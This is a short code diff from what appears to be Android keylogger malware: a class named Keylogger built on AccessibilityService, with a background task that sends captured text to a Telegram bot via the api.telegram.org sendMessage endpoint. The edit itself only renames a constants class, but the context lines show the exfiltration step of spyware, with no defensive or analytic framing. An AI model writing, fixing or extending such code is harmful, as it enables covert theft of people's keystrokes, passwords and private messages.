@@ -27,7 +27,7 @@ public class Keylogger extends AccessibilityService {
         protected Void doInBackground(String... params) {
             try {
                 String message = params[0];
-                String chatId = Constants.TELEGRAM_CHAT_ID; // Retrieve chat ID dynamically
+                String chatId = Constant.TELEGRAM_CHAT_ID; // Retrieve chat ID dynamically
                 String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
                 String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");
 
